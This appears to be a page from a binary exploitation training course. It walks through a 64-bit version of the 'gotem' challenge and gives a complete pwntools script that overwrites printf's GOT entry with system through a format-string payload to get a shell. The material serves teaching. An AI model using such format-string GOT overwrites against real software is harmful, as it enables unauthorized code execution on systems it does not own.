---
description: Repeating a GOT overwrite in 64-bit.
---

# gotem64

{% file src="../../.gitbook/assets/gotem64.zip" %}

This is the same binary as [_gotem_](gotem.md), except we're in 64-bit this time. This makes almost no change in the exploit other than changing the base address of `libc` and the offset of the format string.

Below is a functional exploit. Try to rebuild it independently to understand how to collect the format string offset and the `libc` base address.

{% code title="exploit.py" lineNumbers="true" %}
```python
from pwn import *

elf = context.binary = ELF('./gotem64')
libc = elf.libc
libc.address = 0x00007ffff7c00000
p = process()

payload = fmtstr_payload(6, {elf.got.printf : libc.sym.system})

p.recvline()
p.sendline(payload)
p.interactive()
```
{% endcode %}

Running this exploit gets us a shell, which gives us our flag!
